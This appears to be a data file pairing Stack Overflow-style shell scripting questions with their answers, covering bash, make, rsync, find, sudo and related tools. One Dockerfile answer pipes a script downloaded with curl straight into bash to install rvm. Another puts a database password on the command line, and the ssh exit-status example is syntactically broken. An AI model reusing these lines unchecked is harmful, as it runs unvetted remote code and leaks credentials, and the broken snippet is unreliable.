    "Shebang pointing to script (also having shebang) is effectively ignored": "Looks like Mac OS X requires interpreter to be binary, not another script. To make it work, change the second script's interpreter to\n#!/usr/bin/env /usr/local/bin/my_interpreter\nBut you've got a second problem here: the contents of the second script will not go to stdin of its interpreter, but the script pathname will be passed as command line argument, i.e.\n/usr/bin/env /usr/local/bin/my_interpreter /Users/modchan/test_interpreter/foo.bar\nYou shall read the file by name sys.argv[1] rather than from sys.stdin.",
    "Opening Finder from terminal with file selected": "For me, code below works fine.\nopen -R your-file-path",
    "\"Standardized\" docstring/self-documentation of bash scripts": "The \"File Header\" section of Google's Shell Style Guide is one way to add a 'docstring' to your bash scripts.\nBasically, the answer is to use #, rather than quotes like you would with Python.",
    "Only include files that match a given pattern in a recursive diff": "Perhaps this is a bit indirect, but it ought to work. You can use find to get a list of files that don't match the pattern, and then \"exclude\" all those files:\nfind a b -type f ! -name 'crazy' -printf '%f\\n' | diff -r a b -X -\nThe -X - will make diff read the patterns from stdin and exclude anything that matches. This should work provided your files don't have funny chars like * or ? in their names. The only downside is that your diff won't include the find command, so the listed diff command is not that useful.\n(I've only tested it with GNU find and diff).\nEDIT:\nSince only non-GNU find doesn't have -printf, sed could be used as an alternative:\nfind a b -type f ! -name '*crazy*' -print | sed -e 's|.*/||' | diff -X - -r a b\nThat's also assuming that non-GNU diff has -X which I don't know.",
    "Difference between ** and * in glob matching (.gitignore)": "The difference is that ** doesn't work, at least not for everyone. See\nWhy doesn't gitignore work in this case?\nYou can have a separate .gitignore in pw-spec/",
    "How to make a failing $(shell) command interrupt Make": "There might be a better way, but I tried the following and it works:\n$(if $(shell if your_command; then echo ok; fi), , $(error your_command failed))\nHere I did assume that your_command does not give any output, but it shouldn't be hard to work around such a situation.\nEdit: To make it work with the default Windows shell (and probably any decent shell) you could write your_command && echo ok instead of the if within the shell function. I do not think this is possible for (older) DOS shells. For these you probably want to adapt your_command or write a wrapper script to print something on error (or success).",
    "ftrace: system crash when changing current_tracer from function_graph via echo": "Looks like you are not the only person to notice this behavior. I see\nhttps://lkml.org/lkml/2016/5/13/327\nas a report of the problem, and\nhttps://lkml.org/lkml/2016/5/16/493\nas a patch to the kernel that addresses it. Reading through that whole thread it appears that the issue is some compiler optimizations.",
    "Is there an easy way to determine if user input is an integer in bash?": "One way is to check whether it contains non-number characters. You replace all digit characters with nothing and check for length -- if there's length there's non-digit characters.\nif [[ -n ${input//[0-9]/} ]]; then\n    echo \"Contains letters!\"\nfi\nAnother approach is to check whether the variable, evaluated in arithmetic context, is equal to itself. This is bash-specific\nif [[ $((foo)) != $foo ]]; then\n    echo \"Not just a number!\"\nfi",
    "Changing contents of a file through shell script": "How about something like:\n#!/bin/bash\n\naddr=$1\nport=$2\nuser=$3\n\nsed -i -e \"s/\\(address=\\).*/\\1$1/\" \\\n-e \"s/\\(port=\\).*/\\1$2/\" \\\n-e \"s/\\(username=\\).*/\\1$3/\" xyz.cfg\nWhere $1,$2 and $3 are the arguments passed to the script. Save it a file such as script.sh and make sure it executable with chmod +x script.sh then you can run it like:\n$ ./script.sh 127.8.7.7 7822 xyz_ITR4\n\n$ cat xyz.cfg\ngroup address=127.8.7.7\nport=7822\nJboss username=xyz_ITR4\nThis gives you the basic structure however you would want to think about validating input ect.",
    "check isatty in bash": "to elaborate, I would try\n if [ -t 0 ] ; then\n    # this shell has a std-input, so we're not in batch mode \n   .....\n else\n    # we're in batch mode\n\n    ....\n fi\nI hope this helps.",
    "Bash loop ping successful": "You probably shouldn't rely on textual output of a command to decide this, especially when the ping command gives you a perfectly good return value:\nThe ping utility returns an exit status of zero if at least one response was heard from the specified host; a status of two if the transmission was successful but no responses were received; or another value from <sysexits.h> if an error occurred.\nIn other words, use something like:\n((count = 60))                           # Maximum number to try.\nwhile [[ $count -ne 0 ]] ; do\n    ping -c 1 8.8.8.8                    # Try once.\n    rc=$?\n    if [[ $rc -eq 0 ]] ; then\n        ((count = 1))                    # If okay, flag loop exit.\n    else\n        sleep 1                          # Minimise network storm.\n    fi\n    ((count = count - 1))                # So we don't go forever.\ndone\n\nif [[ $rc -eq 0 ]] ; then                # Make final determination.\n    echo `say The internet is back up.`\nelse\n    echo `say Timeout.`\nfi",
    "cd -1, -2, -3 etc in Z shell": "If you have setopt AUTO_PUSHD in your .zshrc then cd will automatically do a pushd of each directory you change to. Taking the example from ZyX:\n$ setopt AUTO_PUSHD\n$ mkdir -p 1/2/3/4\n$ cd 1\n$ cd 2\n$ cd 3\n$ cd 4\nYou can see a list of the directories using dirs:\n$ dirs -v\n0    ~/1/2/3/4\n1    ~/1/2/3\n2    ~/1/2\n3    ~/1\n4    ~\nTo be able to tab complete the list you can use the + and - arguments with cd (<TAB> meaning you hit the tab key):\n$ cd +<TAB>\n1 -- ~/1/2/3\n2 -- ~/1/2\n3 -- ~/1\n4 -- ~\nOr the reverse:\n$ cd -<TAB>\n0 -- ~\n1 -- ~/1\n2 -- ~/1/2\n3 -- ~/1/2/3\nThen just select the number to go to that directory:\n$ cd +2\n$ pwd\n~/1/2\nTab Complete Directories\nI always forget the magic sequence to do the following so I updated the answer to explain this part.\nThe + and - will only take you to the directory, you can't tab complete the path in the stack (i.e. cd -2/<TAB> gives you nothing). To make this work, you can use a tilde (~).\nMake some directories in 3 to make this example better.\n$ mkdir 3/foo 3/bar 3/baz\nThen find the directory in the stack.\n$ cd ~+<TAB>\n1 -- ~/1/2/3/4\n2 -- ~/1/2/3\n3 -- ~/1\n4 -- ~\nThen use tab completion on an entry.\n$ cd ~+2/<TAB>\n4/    bar/  baz/  foo/",
    "How does : <<'END' work in bash to create a multi-line comment block?": "I'm afraid this explanation is less \"simple\" and more \"thorough\", but here we go.\nThe goal of a comment is to be text that is not interpreted or executed as code.\nOriginally, the UNIX shell did not have a comment syntax per se. It did, however, have the null command : (once an actual binary program on disk, /bin/:), which ignores its arguments and does nothing but indicate successful execution to the calling shell. Effectively, it's a synonym for true that looks like punctuation instead of a word, so you could put a line like this in your script:\n: This is a comment\nIt's not quite a traditional comment; it's still an actual command that the shell executes. But since the command doesn't do anything, surely it's close enough: mission accomplished! Right?\nThe problem is that the line is still treated as a command beyond simply being run as one. Most importantly, lexical analysis - parameter substitution, word splitting, and such - still takes place on those destined-to-be-ignored arguments. Such processing means you run the risk of a syntax error in a \"comment\" crashing your whole script:\n : Let's see what happens next\n echo \"Hello, world!\"\n #=> hello.sh: line 1: unexpected EOF while looking for matching `''\nThat problem led to the introduction of a genuine comment syntax: the now-familiar # (which debuted in the C shell created at BSD before being borrowed back into vanilla sh). Everything from # to the end of the line is completely ignored by the shell, so you can put anything you like there without worrying about syntactic validity:\n # Let's see what happens next\n echo \"Hello, world!\"\n #=> Hello, world!\nAnd that's How The Shell Got Its Comment Syntax.\nHowever, you were looking for a multi-line (block) comment, of the sort introduced by /* (and terminated by */) in C or Java. Unfortunately, the shell simply does not have such a syntax. The normal way to comment out a block of consecutive lines - and the one I recommend - is simply to put a # in front of each one. But that is admittedly not a particularly \"multi-line\" approach.\nSince the shell supports multi-line string-literals, you could just use : with such a string as an argument:\n: 'So\nthis is all\na \"comment\"\n'\nBut that has all the same problems as single-line :. You could also use backslashes at the end of each line to build a long command line with multiple arguments instead of one long string, but that's even more annoying than putting a # at the front, and more fragile since trailing whitespace breaks the line-continuation.\nThe solution you found uses what is called a here-document. The syntax some-command <<whatever causes the following lines of text - from the line immediately after the command, up to but not including the next line containing only the text whatever - to be read and fed as standard input to some-command. Here's an alternative to the usual echo-based shell implementation of \"Hello, world\" which takes advantage of this feature:\ncat <<EOF\nHello, world\nEOF\nIf you replace cat with our old friend :, you'll find that it ignores not only its arguments but also its input: you can feed whatever you want to it, and it will still do nothing (and still indicate that it did that nothing successfully).\nHowever, the contents of a here-document do undergo string processing. So just as with the single-line : comment, the here-document version runs the risk of syntax errors inside what is not meant to be executable code:\n#!/bin/sh -e \n: <<EOF\n(This is a backtick: `)\nEOF\necho 'In modern shells, $(...) is preferred over backticks.'\n#=> ./demo.sh: line 2: bad substitution: no closing \"`\" in `\nThe solution, as seen in the code you found, is to quote the end-of-document \"sentinel\" (the EOF or END or whatever) on the line introducing the here document (e.g. <<'EOF'). Doing this causes the entire body of the here-document to be treated as literal text - no parameter expansion or other processing occurs. Instead, the text is fed to the command unchanged, just as if it were being read from a file. So, other than a line consisting of nothing but the sentinel, the here-document can contain any characters at all:\n#!/bin/sh -e\n: <<'EOF'\n(This is a backtick: `)\nEOF\necho 'In modern shells, $(...) is preferred over backticks.'\n#=> In modern shells, $(...) is preferred over backticks.\n(It is worth noting that the way you quote the sentinel doesn't matter - you can use <<'EOF', <<E\"OF\", or even <<EO\\F; all have the same result. This is different from the way here-documents work in some other languages, such as Perl and Ruby, where the content is treated differently depending on the way the sentinel is quoted.)\nNotwithstanding any of the above, I strongly recommend that you instead just put a # at the front of each line you want to comment out. Any decent code editor will make that operation easy - even plain old vi - and the benefit is that nobody reading your code will have to spend energy figuring out what's going on with something that is, after all, intended to be documentation for their benefit.",
    "bash: how do I concatenate the output of two commands so that I can pipe them to a third?": "Use curly braces to group commands:\n$ { echo first line; echo second line; } | grep \"line\"\nfirst line\nsecond line\n(Posted as an answer from camh's comment)",
    "How to get InfluxDB version via shell": "curl -sL -I localhost:8086/ping\nYou should get something like:\nHTTP/1.1 204 No Content\nContent-Type: application/json\nRequest-Id: c7c8f7d7-b7ef-11e7-8002-000000000000\nX-Influxdb-Version: 1.3.6\nDate: Mon, 23 Oct 2017 12:43:33 GMT\nIf you are using HTTPS:\ncurl -skL -I 'https://myhost:8086/ping'",
    "Convert between byte count and \"human-readable\" string": "numfmt\nTo:\necho \"163564736\" | numfmt --to=iec\nFrom:\necho \"156M\" | numfmt --from=iec",
    "List all aliases available in fish/bash shell": "In bash:\nTo list all aliases:\nalias\nTo add a comment, just put it at the end of the command, e.g.:\n$ alias foo='echo bar #some description'\n\n$ foo\nbar\n\n$ alias foo\nalias foo='echo bar #some description'",
    "redirect command output into variable and standard output in ksh": "How about:\nVAR=$(ls | tee /dev/tty)",
    "Equivalent to unix \"less\" command within R console": "",
    "How to pass command output as multiple arguments to another command": "You can use xargs:\ngrep 'pattern' input | xargs -I% cp \"%\" \"%.bac\"",
    "How to use execvp()": "The first argument is the file you wish to execute, and the second argument is an array of null-terminated strings that represent the appropriate arguments to the file as specified in the man page.\nFor example:\nchar *cmd = \"ls\";\nchar *argv[3];\nargv[0] = \"ls\";\nargv[1] = \"-la\";\nargv[2] = NULL;\n\nexecvp(cmd, argv); //This will run \"ls -la\" as if it were a command",
    "Base64 encoding new line": "echo -n doesn't actually matter here: It controls whether there's a newline on the output from echo, but whether echo emits a newline has no bearing on whether xxd or base64 emit newlines.\nBecause xxd ignores any trailing newline in the input, echo or echo -n will behave precisely the same here; whether there's a newline by echo makes no difference, because that newline (if it exists) will be consumed by xxd when reading its input. Rather, what you ultimately care about is the output of base64, which is what is generating your final result.\nAssuming you have the GNU version of base64, add -w 0 to disable line wrapping in its output. Thus:\nprintf '%s' \"1906 1d8b fb01 3e78 5c21 85db 58a7 0bf9 a6bf 1e42 cb59 95cd 99be 66f7 8758 cf46 315f 1607 66f7 6793 e5b3 61f9 fa03 952d  9101 b129 7180 6f1d ca93 3494 55e0 0e2e\" \\\n  | xxd -r -p \\\n  | base64 -w 0",
    "In shell, split a portion of a string with dot as delimiter [duplicate]": "First, note that you don't use $ when assigning to a parameter in the shell. Your first line should be just this:\nAU_NAME=AU_MSM3-3.7-00.01.02.03\nThe $ is used to get the value of the parameter once assigned. And the bit after the $ can be an expression in curly braces with extra stuff besides just the name, allowing you to perform various operations on the value. For example, you can do something like this:\nIFS=. read major minor micro build <<EOF\n${AU_NAME##*-}\nEOF\nwhere the ##*- strips off everything from the beginning of the string through the last '-', leaving just \"00.01.02.03\", and the IFS (Internal Field Separator) parameter tells the shell where to break the string into fields.\nIn bash, zsh, and ksh93+, you can get that onto one line by shortening the here-document to a here-string:\nIFS=. read major minor micro build <<<\"${AU_NAME##*-}\"\nMore generally, in those same shells, you can split into an arbitrarily-sized array instead of distinct variables:\nIFS=. components=(${AU_NAME##*-})\n(Though that syntax won't work in especially-ancient versions of ksh; in them you have to do this instead:\nIFS=. set -A components ${AU_NAME##*-}\n)\nThat gets you this equivalence (except in zsh, which by default numbers the elements 1-4 instead of 0-3):\nmajor=${components[0]}\nminor=${components[1]}\nmicro=${components[2]}\nbuild=${components[3]}",
    "Cut command to specify the tab as the delimiter [closed]": "Cut splits the input lines at the given delimiter (-d, --delimiter).\nTo split by tabs omit the -d option, because splitting by tabs is the default.\nBy using the -f (--fields) option you can specify the fields you are interrested in.\necho -e \"a\\tb\\tc\" |cut -f 1 # outputs \"a\"\necho -e \"a\\tb\\tc\" |cut -f 2 # outputs \"b\"\necho -e \"a\\tb\\tc\" |cut -f 3 # outputs \"c\"\necho -e \"a\\tb\\tc\" |cut -f 1,3 # outputs \"a\\tc\"\necho -e \"a\\tb\\tc\\td\\te\" |cut -f 2-4 # outputs \"b\\tc\\td\"\nYou can also specify the output delimiter (--output-delimiter) and get rid of lines not containing any delimiters (-s/--only-delimited)\necho -e \"a\\tb\\tc\\td\\te\" |cut -f 2-4 --output-delimiter=\":\" # outputs b:c:d\nIf you are interrested in the first field of your input file simply do...\ncut -f 1 file.txt",
    "Ruby escape ARGV argument or string as argument to shell command": "Use require 'shellwords' and Shellwords.escape, which will fix this sort of stuff for you:\nhttp://apidock.com/ruby/Shellwords/shellescape",
    "How to rsync files with matching pattern in path by keeping directory structure intact?": "I guess you're looking for this:\nrsync -a -m --include='**/commonname/*.foo' --include='*/' --exclude='*' root@1.2.3.4:/var/lib/data /var/lib/data\nThere are 2 differences with your command:\nThe most important one is --include='*/'. Without this, as you specified --exclude='*', rsync will never enter the subdirectories, since everything is excluded. With --include='*/', the subdirectories are not excluded anymore, so rsync can happily recurse.\nThe least important one is -m: this prunes the empty directories. Without this, you'd also get the (empty) subdirectory /var/lib/data/sub3/sub4/differentname/ copied.",
    "How to grep for lines which contain particular words in a log file?": "I would use a regular expression, like this:\ngrep -E 'hello|world|tester' abc.log",
    "How to save/log the output of the iex shell to get persistent command history?": "In Erlang/OTP-20 and higher\nSince Erlang/OTP-20rc2, Shell history is supported out of the box (although initially disabled by default) through a port of this library to the Erlang/OTP code base. Enable the shell in these versions by setting the shell_history kernel environment variable to enabled with export ERL_AFLAGS=\"-kernel shell_history enabled\" added to your environment variables (see Configuration Options to see more options).\n-- https://github.com/ferd/erlang-history\nTrouble shooting\nThe history seems to be not updated (not written to the file)?\nIt seems that the process that is writing the history to the file does it asynchronously and it needs some time to do it before the IEx shell is closed. You need to wait a bit before you exit the shell (e.g. press <ctrl+\\>).\nPre Erlang/OTP-20:\nI have found 2 ways to do it.\n1. Erlang History\nerlang-history (eh) is a tiny pair of files that can be used to patch an Erlang-OTP system to add support for history in the Erlang shell.\nThe history supported is the one available through up/down arrows on the keyboard.\nInstallation in Ubuntu Linux:\nsudo su\ncd /usr/local/src\ngit clone https://github.com/ferd/erlang-history.git\ncd erlang-history\nmake install\nNow every now started Erlang based REPL (and that is IEx) should use erlang-history.\n2. rlwrap\nAs an alternative you can try a more generic REPL enhancer/fixer rlwrap which is a \"readline wrapper\":\n...a small utility that uses the GNU readline library to allow the editing of keyboard input for any command.\nrlwrap -a -A iex -S mix\n(In case you are on Ubuntu Linux use: sudo apt-get install rlwrap)\nIt let's you add a lot more features to the REPL like e.g. the pipeto filter rlwrap -a -z pipeto iex that lets you pipe things to shell commands - very useful to read documentation i.e.: iex> h Stream | less (more)\nKnow downsides:\nIt breaks code completion (i.e. tab completion) in IEx\nWhy is this very useful feature - command history - not already included in Elixir/Erlang?\nhttps://github.com/elixir-lang/elixir/issues/2945#issuecomment-66594851\nhttps://github.com/elixir-lang/elixir/issues/1516#issuecomment-21772851\nWhen using asdf see this.",
    "Top unix command ascending order [closed]": "Using F you'd get you to the menu of fields. Using s would set what field would do the sorting. Press ESC to escape from the menu then to change Ascending/Descending mode, use R.",
    "sha1 password hash linux": "I know this is really old but here is why it did not work and what to do about it:\nWhen you run the\necho -n \"hello\" | sha1sum\nas in your example you get\naaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d  -\nNotice the '-' in the end.\nThe hash in front is the correct sha1 hash for hello, but the dash messes up the hash.\nIn order to get only the first part you can do this:\necho -n \"hello\" | sha1sum | awk '{print $1}'\nThis will feed your output through awk and give you only the 1st column. Result: The correct sha1 for \"hello\"\naaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d\nHope this helps someone.",
    "How to kill a range of consecutive processes in Linux?": "Use the shell's brace expansion syntax:\n$ kill {3457..3464}\nwhich expands to:\n$ kill 3457 3458 3459 3460 3461 3462 3463 3464\nOr you can kill processes by name with pkill. For example:\n$ pkill -f process_to_kill.py",
    "How to define global shell functions in a Makefile?": "This solution does not rely on an external temporary file and does not force you to tinker with the SHELL variable.\nTESTTOOL=sh -c '\\\n  do_some_complicated_tests $$1 $$2; \\\n  if something; then                 \\\n    build_thisway $$1 $$2;           \\\n  else                               \\\n    build_otherway $$1 $$2;          \\\n  fi' TESTTOOL\n\nifneq (,$(filter n,$(MAKEFLAGS)))\nTESTTOOL=: TESTTOOL\nendif\n\nfoo: bar\n    ${TESTTOOL} foo baz\nThe ifneq\u2026endif block checks for the -n flag on the command line and sets the expansion of TESTTOOL to : TESTTOOL which is easy to read and safe to execute.\nThe best solution could be to turn the shell function into an actual program if this is an option for you.",
    "Execute a shell command": "Everybody is looking for:\nuse std::process::Command;\n\nfn main() {\n    let output = Command::new(\"echo\")\n        .arg(\"Hello world\")\n        .output()\n        .expect(\"Failed to execute command\");\n\n    assert_eq!(b\"Hello world\\n\", output.stdout.as_slice());\n}\nFor more information and examples, see the docs.\nYou wanted to simulate &&. std::process::Command has a status method that returns a Result<T> and Result implements and_then. You can use and_then like a && but in more safe Rust way :)",
    "How do I pipe something from the command line to a new Github gist?": "Seems like GitHub has a simple REST API, including methods for creating Gists. Just for fun:\n$ curl -X POST \\\n    --data-binary '{\"files\": {\"file1.txt\": {\"content\": \"Hello, SO\"}}}' \\\n    https://api.github.com/gists\nThis successfully created this Gist. I guess it's enough to get you started.",
    "Bash: How to invoke command and store the result in a variable?": "You most likely want to use batch mode (-B) and disable column names (--disable-column-names) for non-interactive mysql output:\nout=$(mysql -B -db mydb -uanon -ppwd --disable-column-names  -e \"select count(*) from table1\";)",
    "Changing to root user inside shell script": "sudo will work here but you need to change your script a little bit:\n$ cat 1.sh \nid \nsudo -s <<EOF\necho Now i am root\nid\necho \"yes!\"\nEOF\n\n$ bash 1.sh\nuid=1000(igor) gid=1000(igor) groups=1000(igor),29(audio),44(video),124(fuse)\nNow i am root\nuid=0(root) gid=0(root) groups=0(root)\nyes!\nYou need to run your command in <<EOF block and give the block to sudo.\nIf you want, you can use su, of course. But you need to run it using expect/pexpect that will enter password for you.\nBut even in case you could manage to enter the password automatically (or switch it off) this construction would not work:\nuser-command\nsu \nroot-command\nIn this case root-command will be executed with user, not with root privileges, because it will be executed after su will be finished (su opens a new shell, not changes uid of the current shell). You can use the same trick here of course:\nsu -c 'sh -s' <<EOF\n# list of root commands\nEOF\nBut now you have the same as with sudo.",
    "What grep command will include the current function name in its output?": "There is no such function in GNU grep, although it has been discussed in the past.\nHowever if your code is under git's control, git grep has an option -p that will do that.",
    "Executing shell script with system() returns 256. What does that mean?": "According to this and that, Perl's system() returns exit values multiplied by 256. So it's actually exiting with 1. It seems this happens in C too.",
    "Using 'find' to return filenames without extension": "To return only filenames without the extension, try:\nfind . -type f -iname \"*.ipynb\" -execdir sh -c 'printf \"%s\\n\" \"${0%.*}\"' {} ';'\nor (omitting -type f from now on):\nfind \"$PWD\" -iname \"*.ipynb\" -execdir basename {} .ipynb ';'\nor:\nfind . -iname \"*.ipynb\" -exec basename {} .ipynb ';'\nor:\nfind . -iname \"*.ipynb\" | sed \"s/.*\\///; s/\\.ipynb//\"\nhowever invoking basename on each file can be inefficient, so @CharlesDuffy suggestion is:\nfind . -iname '*.ipynb' -exec bash -c 'printf \"%s\\n\" \"${@%.*}\"' _ {} +\nor:\nfind . -iname '*.ipynb' -execdir basename -s '.sh' {} +\nUsing + means that we're passing multiple files to each bash instance, so if the whole list fits into a single command line, we call bash only once.\nTo print full path and filename (without extension) in the same line, try:\nfind . -iname \"*.ipynb\" -exec sh -c 'printf \"%s\\n\" \"${0%.*}\"' {} ';'\nor:\nfind \"$PWD\" -iname \"*.ipynb\" -print | grep -o \"[^\\.]\\+\"\nTo print full path and filename on separate lines:\nfind \"$PWD\" -iname \"*.ipynb\" -exec dirname \"{}\" ';' -exec basename \"{}\" .ipynb ';'",
    "Bash Centos7 \"which\" command": "To find a package in CentOS, use yum whatprovides:\nyum whatprovides *bin/which\nIn this particular case, the package is called which, so\nyum install which\nshould pull it in.",
    "Convert a text string in bash to array": "In order to convert the string to an array, say:\n$ str=\"title1 title2 title3 title4 title5\"\n$ arr=( $str )\nThe shell would perform word splitting on spaces unless you quote the string.\nIn order to loop over the elements in the thus created array:\n$ for i in \"${arr[@]}\"; do echo $i; done\ntitle1\ntitle2\ntitle3\ntitle4\ntitle5",
    "Sed not working inside bash script": "Try\nsed -e \"s/${VAR1}/${VAR2}/g\" ${VAR3}\nBash reference says:\nThe characters \u2018$\u2019 and \u2018`\u2019 retain their special meaning within double quotes\nThus it will be able to resolve your variables",
    "Implementing infinite wait in shell scripting": "you can use a named pipe for your read:\nmkfifo /tmp/mypipe\n#or mknode /tmp/mypipe p\nif you later want to send different arbitrary \"signals\" to the pipe, the read can be use in combination with a case statement to take appropriate actions (even useful ones)\nwhile read SIGNAL; do\n    case \"$SIGNAL\" in\n        *EXIT*)break;;\n        *)echo \"signal  $SIGNAL  is unsupported\" >/dev/stderr;;\n    esac\ndone < /tmp/mypipe",
    "How to pass parameters from bash to php script?": "",
    "what does `curl -e` or `curl --referer` mean?": "From the man page of cURL\n-e, --referer <URL>\n(HTTP) Sends the \"Referrer Page\" information to the HTTP server. This can also be set with the -H, --header flag of course. When used with -L, --location you can append \";auto\" to the --referer URL to make curl automatically set the previous URL when it follows a Location: header. The \";auto\" string can be used alone, even if you don't set an initial --referer.\nEssentially this tells the server which page sent you there.",
    "About the usage of linux command \"xargs\"": "xargs puts the words coming from the standard input to the end of the argument list of the given command. The first form therefore creates\ncp /tmp/ ./useful/love.txt ./useful/loveyou.txt\nWhich does not work, because there are more than 2 arguments and the last one is not a directory.\nThe -i option tells xargs to process one file at a time, though, replacing {} with its name, so it is equivalent to\ncp ./useful/love.txt    /tmp/\ncp ./useful/loveyou.txt /tmp/\nWhich clearly works well.",
    "Echo some command lines in a shell script (echo on for single command)": "At the cost of a process per occasion, you can use:\n(set -x; ls $dir)\nThis runs the command in a sub-shell, so the set -x only affects what's inside the parentheses. You don't need to code or see the set +x. I use this when I need to do selective tracing.",
    "What does `set -o errtrace` do in a shell script?": "From the manual:\nerrtrace Same as -E.\n-E If set, any trap on ERR is inherited by shell functions, command substitutions, and commands executed in a sub\u2010 shell environment. The ERR trap is normally not inher\u2010 ited in such cases.\nWhen errtrace is enabled, the ERR trap is also triggered when the error (a command returning a nonzero code) occurs inside a function or a subshell. Another way to put it is that the context of a function or a subshell does not inherit the ERR trap unless errtrace is enabled.\n#!/bin/bash\n\nset -o errtrace\n\nfunction x {\n    echo \"X begins.\"\n    false\n    echo \"X ends.\"\n}\n\nfunction y {\n    echo \"Y begins.\"\n    false\n    echo \"Y ends.\"\n}\n\ntrap 'echo \"ERR trap called in ${FUNCNAME-main context}.\"' ERR\nx\ny\nfalse\ntrue\nOutput:\nX begins.\nERR trap called in x.\nX ends.\nY begins.\nERR trap called in y.\nY ends.\nERR trap called in main context.\nWhen errtrace is not enabled:\nX begins.\nX ends.\nY begins.\nY ends.\nERR trap called in main context.",
    "How do I access arguments to functions if there are more than 9 arguments?": "Use :\n#!/bin/bash\necho ${10}\nTo test the difference with $10, code in foo.sh :\n#!/bin/bash\necho $10\necho ${10}\nThen :\n$ ./foo.sh first 2 3 4 5 6 7 8 9 10\nfirst0\n10\nthe same thing is true if you have :\nfoobar=42\nfoo=FOO\necho $foobar # echoes 42\necho ${foo}bar # echoes FOObar\nUse {} when you want to remove ambiguities ...\nmy2c",
    "shell script ssh command exit status": "ssh will exit with the exit code of the remote command. For example:\n$ ssh localhost exit 10\n$ echo $?\n10\nSo after your ssh command exits, you can simply check $?. You need to make sure that you don't mask your return value. For example, your ssh command finishes up with:\necho $?\nThis will always return 0. What you probably want is something more like this:\nwhile read HOST; do\n  echo $HOST\n  if ssh $HOST 'somecommand' < /dev/null; then\n    echo SUCCESS\n  else\n    echo FAIL\ndone\nYou could also write it like this:\nwhile read HOST; do\n  echo $HOST\n  if ssh $HOST 'somecommand' < /dev/null\n  if [ $? -eq 0 ]; then\n    echo SUCCESS\n  else\n    echo FAIL\ndone",
    "Copy a string to clipboard from Mac OS command line": "You need to pipe the output of your script to pbcopy\nFor example:\n./somescript.sh | pbcopy",
    "How to use Jenkins parameters in a shell script": "",
    "Execute command after every command in bash": "To execute a cmd before every command entered, set a trap on DEBUG. Eg.\ntrap date DEBUG\nTo execute that command before emitting a prompt, set PROMPT_COMMAND:\nPROMPT_COMMAND=date",
    "Why do I have to use bash -l -c inside my container?": "From bash(1):\n-l Make bash act as if it had been invoked as a login shell\n-c If the -c option is present, then commands are read from string.\nYou're running the command passed to the -c argument. -l makes it a login shell so bash first reads /etc/profile, which probably has the path to rvm which is what makes it work.\nFWIW, here's what I do to install rvm in a docker container.\n# Install some dependencies\nRUN apt-get -y -q install curl rubygems\n\n# Install rvm\nRUN curl -L https://get.rvm.io | bash -s stable\n\n# Install package dependencies\nRUN /usr/local/rvm/bin/rvm requirements\n\n# Install ruby\nRUN /usr/local/rvm/bin/rvm install ruby-2.0.0\n\n# create first wrapper scripts\nRUN /usr/local/rvm/bin/rvm wrapper ruby-2.0.0 myapp rake rails gem",
    "In Bash how do you see if a string is not in an array?": "You can negate the result of the positive match:\nif ! [[ ${accounts[*]} =~ \"$account\" ]]\nor\nif [[ ! ${accounts[*]} =~ \"$account\" ]]\nHowever, notice that if $account equals \"user\", you'll get a match, since it matches a substring of \"power_user\". It's best to iterate explicitly:\nmatch=0\nfor acc in \"${accounts[@]}\"; do\n    if [[ $acc = \"$account\" ]]; then\n        match=1\n        break\n    fi\ndone\nif [[ $match = 0 ]]; then\n    echo \"No match found\"\nfi",
    "Match all files under all nested directories with shell globbing": "In Bash 4, with shopt -s globstar, and zsh you can use **/* which will include everything except hidden files. You can do shopt -s dotglob in Bash 4 or setopt dotglob in zsh to cause hidden files to be included.\nIn ksh, set -o globstar enables it. I don't think there's a way to include dot files implicitly, but I think **/{.[^.],}* works.",
    "How does `alias sudo=\"sudo \"` work?": "Looking at the man page for alias:\nA trailing space in VALUE causes the next word to be checked for alias substitution when the alias is expanded.\nSource: http://www.linuxcommand.org/lc3_man_pages/aliash.html",
    "shell string bad substitution": "If your shell is a sufficiently recent version of bash, that parameter expansion notation should work.\nIn many other shells, it will not work, and a bad substitution error is the way the shell says 'You asked for a parameter substitution but it does not make sense to me'.\nAlso, given the script:\n#! /bin/sh\nlength=echo `expr index \"$1\" .zip`\na=$1    \necho $(a:0:length}\nThe second line exports variable length with value echo for the command that is generated by running expr index \"$1\" .zip. It does not assign to length. That should be just:\nlength=$(expr index \"${1:?}\" .zip)\nwhere the ${1:?} notation generates an error if $1 is not set (if the script is invoked with no arguments).\nThe last line should be:\necho ${a:0:$length}\nNote that if $1 holds filename.zip, the output of expr index $1 .zip is 2, because the letter i appears at index 2 in filename.zip. If the intention is to get the base name of the file without the .zip extension, then the classic way to do it is:\nbase=$(basename $1 .zip)\nand the more modern way is:\nbase=${1%.zip}\nThere is a difference; if the name is /path/to/filename.zip, the classic output is filename and the modern one is /path/to/filename. You can get the classic output with:\nbase=${1%.zip}\nbase=${base##*/}\nOr, in the classic version, you can get the path with:\nbase=$(dirname $1)/$(basename $1 .zip)\nIf the file names can contain spaces, you need to think about using double quotes, especially in the invocations of basename and dirname.",
    "How to get a valid font name on linux system which can be used in .Xresources config?": "First, you have to decide if you want to use core protocol or Xft for font rendering. As you see in another answer, xfontsel is the right tool to get a correct font name for core protocol. But it's unlikely to be what you want for truetype fonts (do you want antialiasing? Then Xft is your choice).\nIf urxvt is built with Xft support (check urxvt --help 2>&1 | grep options to be sure), you might want to give it font names prefixed by xft:\nURxvt.font: xft:Courier New\nOther options affecting font matching and rendering may be specified in xft font name:\nURxvt.font: xft:Courier New:pixelsize=18:antialias=false\n(search man rxvt for xft: for further details)\nAll available font names can be queried with fc-list. E.g. fc-list|grep courbd.ttf shows you the font name is Courier New and style is Bold (append :style=Bold to select it).\nUse fc-match \"Courier New\" to check which font is the best match for a given name from Xft's point of view.\nOther applications may have their own conventions for X11 and Xft font names. E.g. the same xft: prefix is used by emacs; xterm uses faceName and renderFont resources to determine whether to use Xft and which font to request; xedit supports core protocol only. The mere fact that the application is configurable from X resources isn't enough to tell how the font names are interpreted.",
